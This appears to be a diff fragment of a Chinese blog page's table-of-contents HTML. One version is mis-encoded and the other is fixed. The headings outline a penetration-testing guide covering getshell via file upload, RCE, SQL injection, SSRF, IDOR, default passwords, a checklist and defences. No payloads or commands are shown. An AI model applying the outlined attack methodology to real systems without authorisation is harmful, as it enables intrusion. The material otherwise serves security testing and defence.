nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4%E9%8E%AC%E6%BF%8A%E7%9F%BE"><span class="nav-number">2.0.1.2.</span> <span class="nav-text">鍒╃敤鎬濊矾</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E9%8D%99%E5%B6%85%E7%B0%AD%E9%8D%92%E6%A5%80%E5%AF%B2-%E9%88%AB-RCE"><span class="nav-number">2.0.2.</span> <span class="nav-text">3.3 鍙嶅簭鍒楀寲 鈫?RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AA%E5%8F%86%E9%8D%99-1"><span class="nav-number">2.0.2.1.</span> <span class="nav-text">妫€娴嬪叆鍙?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4%E9%8E%AC%E6%BF%8A%E7%9F%BE-1"><span class="nav-number">2.0.2.2.</span> <span class="nav-text">鍒╃敤鎬濊矾</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-%E6%B5%A0%E7%BB%98%E5%89%B0%E9%8D%9B%E6%88%92%E6%8A%A4%E9%8E%B5%D1%86%EE%94%91"><span class="nav-number">2.0.3.</span> <span class="nav-text">3.4 浠绘剰鍛戒护鎵ц</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%AF%E6%AD%8C%EE%9D%86%E7%91%99%EF%B9%80%E5%BD%82%E9%90%90"><span class="nav-number">2.0.3.1.</span> <span class="nav-text">甯歌瑙﹀彂鐐?</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%A5%E6%B6%96%E2%82%AC%E4%BD%B7%E8%85%91%E6%A5%82%E6%A8%BA%E5%B5%84%E5%A9%95%E5%BF%94%E7%A4%8A%E9%94%9B%E5%9C%A51-P2%E9%94%9B"><span class="nav-number">2.1.</span> <span class="nav-text">鍥涖€佷腑楂樺嵄婕忔礊锛圥1-P2锛?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E9%8F%81%E5%BF%94%E5%8A%85%E6%B7%87%E2%84%83%E4%BC%85%E5%A8%89%E5%8B%AF%E6%B9%B6"><span class="nav-number">2.1.1.</span> <span class="nav-text">4.1 鏁忔劅淇℃伅娉勯湶</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E7%92%BA%EE%88%9A%E7%B7%9E"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">娴嬭瘯璺緞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A3%B0%E5%8B%AC%E6%B9%A1%E9%8D%9D%E5%B6%85%E7%B0%B2%E9%94%9B%E5%9C%9DSON-%E9%8F%8D%E7%85%8E%E7%B4%A1%E9%94%9B"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">棰勬湡鍝嶅簲锛圝SON 鏍煎紡锛?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E5%A7%98%E6%9D%91%E9%92%A9%E7%93%92%E5%A9%83%E6%BD%88%E9%94%9B%E5%9C%9BDOR%E9%94%9B"><span class="nav-number">2.1.2.</span> <span class="nav-text">4.2 姘村钩瓒婃潈锛圛DOR锛?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E9%8D%A6%E7%83%98%E6%AB%99"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">娴嬭瘯鍦烘櫙</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4%E9%96%BE"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">鍒╃敤閾?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E9%8D%A8%E5%82%9C%E6%B4%BF%E7%93%92%E5%A9%83%E6%BD%88-%E6%B5%A0%E7%BB%98%E5%89%B0%E9%90%A2%E3%84%A6%E5%9F%9B%E5%A8%A3%E8%AF%B2%E5%A7%9E"><span class="nav-number">2.1.3.</span> <span class="nav-text">4.3 鍨傜洿瓒婃潈 &#x2F; 浠绘剰鐢ㄦ埛娣诲姞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E7%92%BA%EE%88%9A%E7%B7%9E-1"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">娴嬭瘯璺緞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF-PoC"><span class="nav-number">2.1.3.2.</span> <span class="nav-text">娴嬭瘯 PoC</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-%E6%B5%A0%E7%BB%98%E5%89%B0%E7%80%B5%E5%97%99%E7%88%9C%E9%96%B2%E5%B6%87%E7%96%86"><span class="nav-number">2.1.4.</span> <span class="nav-text">4.4 浠绘剰瀵嗙爜閲嶇疆</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E7%92%BA%EE%88%9A%E7%B7%9E-2"><span class="nav-number">2.1.4.1.</span> <span class="nav-text">娴嬭瘯璺緞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-SQL-%E5%A8%89%E3%84%A5%E5%8F%86"><span class="nav-number">2.1.5.</span> <span class="nav-text">4.5 SQL 娉ㄥ叆</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E9%8D%8F%E3%83%A5%E5%BD%9B"><span class="nav-number">2.1.5.1.</span> <span class="nav-text">娴嬭瘯鍏ュ彛</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-6-Druid-%E9%90%A9%E6%88%9E%E5%B8%B6%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">2.1.6.</span> <span class="nav-text">4.6 Druid 鐩戞帶鏈巿鏉?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E7%92%BA%EE%88%9A%E7%B7%9E-3"><span class="nav-number">2.1.6.1.</span> <span class="nav-text">娴嬭瘯璺緞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%97%E5%8D%9E%EE%86%8A%E9%94%9B%E6%B0%B6%E2%82%AC%E6%B0%B3%E7%B9%83-Session-%E5%A8%89%E5%8B%AF%E6%B9%B6%E9%90%A9%E5%AD%98%E5%B8%B4%E7%BB%90%E5%86%A8%E5%BD%87%E7%BB%A0%EF%BC%84%E6%82%8A%E9%8D%9B%E6%A8%B9%E7%B4%B0%E7%92%87-%E9%88%AB-%E9%91%BE%E5%B3%B0%E5%BD%87%E9%8D%9A%E5%BA%A1%E5%BD%B4%E9%8F%89%E5%86%AE%E6%AA%BA%E9%8A%86"><span class="nav-number">2.2.</span> <span class="nav-text">鍗卞锛氶€氳繃 Session 娉勯湶鐩存帴绐冨彇绠＄悊鍛樹細璇?鈫?鑾峰彇鍚庡彴鏉冮檺銆?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-7-Swagger-API-%E9%8F%82%E5%9B%A8%E3%80%82%E5%A8%89%E5%8B%AF%E6%B9%B6"><span class="nav-number">2.2.1.</span> <span class="nav-text">4.7 Swagger API 鏂囨。娉勯湶</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E7%92%BA%EE%88%9A%E7%B7%9E-4"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">娴嬭瘯璺緞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%9C%E6%96%BB%E2%82%AC%E4%BD%B7%E8%85%91%E9%8D%97%E8%BE%A8%E7%B4%A1%E5%A8%B2%E7%83%87%E7%B4%99P2-P3%E9%94%9B"><span class="nav-number">2.3.</span> <span class="nav-text">浜斻€佷腑鍗辨紡娲烇紙P2-P3锛?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-SSRF%E9%94%9B%E5%A0%9F%E6%B9%87%E9%8D%94%EF%BC%84%EE%81%AC%E7%92%87%E9%94%8B%E7%9C%B0%E6%B5%BC%EE%81%88%E2%82%AC%E7%8B%85%E7%B4%9A"><span class="nav-number">2.3.1.</span> <span class="nav-text">5.1 SSRF锛堟湇鍔＄璇锋眰浼€狅級</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E9%8D%8F%E3%83%A5%E5%BD%9B-1"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">娴嬭瘯鍏ュ彛</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4"><span class="nav-number">2.3.1.2.</span> <span class="nav-text">鍒╃敤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E9%90%A9%EE%86%BC%E7%B6%8D%E9%96%AC%E5%B6%85%E5%B7%BB-%E6%B5%A0%E7%BB%98%E5%89%B0%E9%8F%82%E5%9B%A6%E6%AC%A2%E7%92%87%E8%AF%B2%E5%BD%87"><span class="nav-number">2.3.2.</span> <span class="nav-text">5.2 鐩綍閬嶅巻 &#x2F; 浠绘剰鏂囦欢璇诲彇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E9%8D%8F%E3%83%A5%E5%BD%9B-2"><span class="nav-number">2.3.2.1.</span> <span class="nav-text">娴嬭瘯鍏ュ彛</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%8F%E6%8A%BD%E6%95%AD%E7%92%87%E8%AF%B2%E5%BD%87%E9%90%A9%EE%86%BD%E7%88%A3"><span class="nav-number">2.3.2.2.</span> <span class="nav-text">鍏抽敭璇诲彇鐩爣</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%8F%EE%85%9C%E2%82%AC%E4%BD%B8%E5%87%A1%E9%90%AD%E3%83%A5%E7%95%BC%E9%8F%82%E7%91%B0%E7%95%A8%E9%8D%8F%E3%84%A5%EF%BC%90%E9%8F%84"><span class="nav-number">2.4.</span> <span class="nav-text">鍏€佸凡鐭ュ畼鏂瑰畨鍏ㄥ０鏄?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%93%E5%86%A6%E2%82%AC%E4%BD%B8%E7%96%84%E9%8E%B4%E6%A8%BB%EE%97%85%E5%A8%B4-Checklist"><span class="nav-number">2.5.</span> <span class="nav-text">涓冦€佸疄鎴樻娴?Checklist</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-0%E9%94%9B%E6%B0%AD%E5%AF%9A%E7%BB%BE%E5%9C%AD%E2%80%98%E7%92%81"><span class="nav-number">2.5.1.</span> <span class="nav-text">Phase 0锛氭寚绾圭‘璁?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-1%E9%94%9B%E6%B0%AB%E4%BF%8A%E9%8E%AD%EE%88%9B%E6%95%B9%E9%97%86"><span class="nav-number">2.5.2.</span> <span class="nav-text">Phase 1锛氫俊鎭敹闆?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-2%E9%94%9B%E6%B0%AD%E6%B9%AD%E9%8E%BA%E5%A0%9F%E6%BD%88-API-%E5%A6%AB%E2%82%AC%E5%A8%B4"><span class="nav-number">2.5.3.</span> <span class="nav-text">Phase 2锛氭湭鎺堟潈 API 妫€娴?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-3%E9%94%9B%E6%B0%AD%E7%B9%81%E6%90%B4%EF%B9%80%E5%9F%84%E9%90%A2"><span class="nav-number">2.5.4.</span> <span class="nav-text">Phase 3锛氭繁搴﹀埄鐢?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%8F%EE%82%A0%E2%82%AC%E4%BE%80%E6%A7%BB%E5%AF%B0%E2%80%B3%E7%BC%93%E7%92%81"><span class="nav-number">2.6.</span> <span class="nav-text">鍏€侀槻寰″缓璁?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E7%80%B5%E7%A1%85%E7%B9%8D%E7%BC%81%E5%AD%98%E6%9F%9F"><span class="nav-number">2.6.1.</span> <span class="nav-text">8.1 瀵硅繍缁存柟</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E7%80%B5%E8%A7%84%E7%A5%B4%E7%92%87%E6%9B%9F%E6%9F%9F"><span class="nav-number">2.6.2.</span> <span class="nav-text">8.2 瀵规祴璇曟柟</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%84%E5%8B%B6%E7%B4%B0%E9%8F%8C%E3%83%A8%EE%87%97%E9%91%B4%E6%B0%AD%E6%B9%B0"><span class="nav-number">2.7.</span> <span class="nav-text">闄勶細鏌ヨ鑴氭湰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%8E%B5%E5%BD%92%E5%99%BA%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AD%E5%89%BC%E9%8F%88%EE%84%8A%E7%B4%99PowerShell%E9%94%9B"><span class="nav-number">2.7.1.</span> <span class="nav-text">鎵归噺妫€娴嬭剼鏈紙PowerShell锛?</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BA%A7%E5%93%81%E8%83%8C%E6%99%AF%E4%B8%8E%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB"><span class="nav-number">2.</span> <span class="nav-text">一、产品背景与特征识别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E4%BA%A7%E5%93%81%E6%A6%82%E8%BF%B0"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 产品概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E6%8C%87%E7%BA%B9%E7%89%B9%E5%BE%81"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 指纹特征</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-%E5%93%8D%E5%BA%94%E5%A4%B4%E7%89%B9%E5%BE%81"><span class="nav-number">2.2.1.</span> <span class="nav-text">HTTP 响应头特征</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A1%B5%E9%9D%A2-HTML-%E7%89%B9%E5%BE%81"><span class="nav-number">2.2.2.</span> <span class="nav-text">页面 &#x2F; HTML 特征</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3"><span class="nav-number">2.2.3.</span> <span class="nav-text">默认端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%90%8E%E5%8F%B0%E8%B7%AF%E5%BE%84"><span class="nav-number">2.2.4.</span> <span class="nav-text">常见后台路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FOFA-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%8C%87%E7%BA%B9"><span class="nav-number">2.2.5.</span> <span class="nav-text">FOFA &#x2F; 搜索引擎指纹</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-API-%E8%B7%AF%E5%BE%84%E8%A7%84%E5%BE%8B"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 API 路径规律</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81API%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%85%A8%E6%99%AF%E5%9B%BE"><span class="nav-number">3.</span> <span class="nav-text">二、API未授权漏洞全景图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88P0-P1%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">三、高危漏洞（P0-P1）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E2%86%92-Getshell"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 任意文件上传 → Getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E5%85%A5%E5%8F%A3"><span class="nav-number">4.1.1.</span> <span class="nav-text">检测入口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95-PoC"><span class="nav-number">4.1.2.</span> <span class="nav-text">测试 PoC</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-SSTI-%E2%86%92-RCE"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 模板注入 &#x2F; SSTI → RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E5%85%A5%E5%8F%A3-1"><span class="nav-number">4.2.1.</span> <span class="nav-text">检测入口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">4.2.2.</span> <span class="nav-text">利用思路</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E2%86%92-RCE"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 反序列化 → RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E5%85%A5%E5%8F%A3-2"><span class="nav-number">4.3.1.</span> <span class="nav-text">检测入口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-1"><span class="nav-number">4.3.2.</span> <span class="nav-text">利用思路</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">4.4.</span> <span class="nav-text">3.4 任意命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="nav-number">4.4.1.</span> <span class="nav-text">常见触发点</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E4%B8%AD%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88P1-P2%EF%BC%89"><span class="nav-number">5.</span> <span class="nav-text">四、中高危漏洞（P1-P2）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 敏感信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E8%B7%AF%E5%BE%84"><span class="nav-number">5.1.1.</span> <span class="nav-text">测试路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E5%93%8D%E5%BA%94%EF%BC%88JSON-%E6%A0%BC%E5%BC%8F%EF%BC%89"><span class="nav-number">5.1.2.</span> <span class="nav-text">预期响应（JSON 格式）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%EF%BC%88IDOR%EF%BC%89"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 水平越权（IDOR）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E5%9C%BA%E6%99%AF"><span class="nav-number">5.2.1.</span> <span class="nav-text">测试场景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">5.2.2.</span> <span class="nav-text">利用链</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0"><span class="nav-number">5.3.</span> <span class="nav-text">4.3 垂直越权 &#x2F; 任意用户添加</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E8%B7%AF%E5%BE%84-1"><span class="nav-number">5.3.1.</span> <span class="nav-text">测试路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95-PoC-1"><span class="nav-number">5.3.2.</span> <span class="nav-text">测试 PoC</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="nav-number">5.4.</span> <span class="nav-text">4.4 任意密码重置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E8%B7%AF%E5%BE%84-2"><span class="nav-number">5.4.1.</span> <span class="nav-text">测试路径</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-number">5.5.</span> <span class="nav-text">4.5 SQL 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E5%85%A5%E5%8F%A3"><span class="nav-number">5.5.1.</span> <span class="nav-text">测试入口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-6-Druid-%E7%9B%91%E6%8E%A7%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="nav-number">5.6.</span> <span class="nav-text">4.6 Druid 监控未授权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E8%B7%AF%E5%BE%84-3"><span class="nav-number">5.6.1.</span> <span class="nav-text">测试路径</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-7-Swagger-API-%E6%96%87%E6%A1%A3%E6%B3%84%E9%9C%B2"><span class="nav-number">5.7.</span> <span class="nav-text">4.7 Swagger API 文档泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E8%B7%AF%E5%BE%84-4"><span class="nav-number">5.7.1.</span> <span class="nav-text">测试路径</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E4%B8%AD%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88P2-P3%EF%BC%89"><span class="nav-number">6.</span> <span class="nav-text">五、中危漏洞（P2-P3）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-SSRF%EF%BC%88%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 SSRF（服务端请求伪造）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E5%85%A5%E5%8F%A3-1"><span class="nav-number">6.1.1.</span> <span class="nav-text">测试入口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">6.1.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 目录遍历 &#x2F; 任意文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E5%85%A5%E5%8F%A3-2"><span class="nav-number">6.2.1.</span> <span class="nav-text">测试入口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E8%AF%BB%E5%8F%96%E7%9B%AE%E6%A0%87"><span class="nav-number">6.2.2.</span> <span class="nav-text">关键读取目标</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 存储型 XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E5%85%A5%E5%8F%A3-3"><span class="nav-number">6.3.1.</span> <span class="nav-text">测试入口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4"><span class="nav-number">6.4.</span> <span class="nav-text">5.4 弱口令 &#x2F; 默认口令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4"><span class="nav-number">6.4.1.</span> <span class="nav-text">常见默认口令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E8%B7%AF%E5%BE%84%E7%88%86%E7%A0%B4"><span class="nav-number">6.4.2.</span> <span class="nav-text">后台路径爆破</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E5%B7%B2%E7%9F%A5%E5%AE%98%E6%96%B9%E5%AE%89%E5%85%A8%E5%A3%B0%E6%98%8E"><span class="nav-number">7.</span> <span class="nav-text">六、已知官方安全声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E5%AE%9E%E6%88%98%E6%A3%80%E6%B5%8B-Checklist"><span class="nav-number">8.</span> <span class="nav-text">七、实战检测 Checklist</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-0%EF%BC%9A%E6%8C%87%E7%BA%B9%E7%A1%AE%E8%AE%A4"><span class="nav-number">8.1.</span> <span class="nav-text">Phase 0：指纹确认</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-1%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">8.2.</span> <span class="nav-text">Phase 1：信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-2%EF%BC%9A%E6%9C%AA%E6%8E%88%E6%9D%83-API-%E6%A3%80%E6%B5%8B"><span class="nav-number">8.3.</span> <span class="nav-text">Phase 2：未授权 API 检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-3%EF%BC%9A%E6%B7%B1%E5%BA%A6%E5%88%A9%E7%94%A8"><span class="nav-number">8.4.</span> <span class="nav-text">Phase 3：深度利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.</span> <span class="nav-text">八、防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E5%AF%B9%E8%BF%90%E7%BB%B4%E6%96%B9"><span class="nav-number">9.1.</span> <span class="nav-text">8.1 对运维方</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E5%AF%B9%E6%B5%8B%E8%AF%95%E6%96%B9"><span class="nav-number">9.2.</span> <span class="nav-text">8.2 对测试方</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84%EF%BC%9A%E6%9F%A5%E8%AF%A2%E8%84%9A%E6%9C%AC"><span class="nav-number">10.</span> <span class="nav-text">附：查询脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC%EF%BC%88PowerShell%EF%BC%89"><span class="nav-number">10.1.</span> <span class="nav-text">批量检测脚本（PowerShell）</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
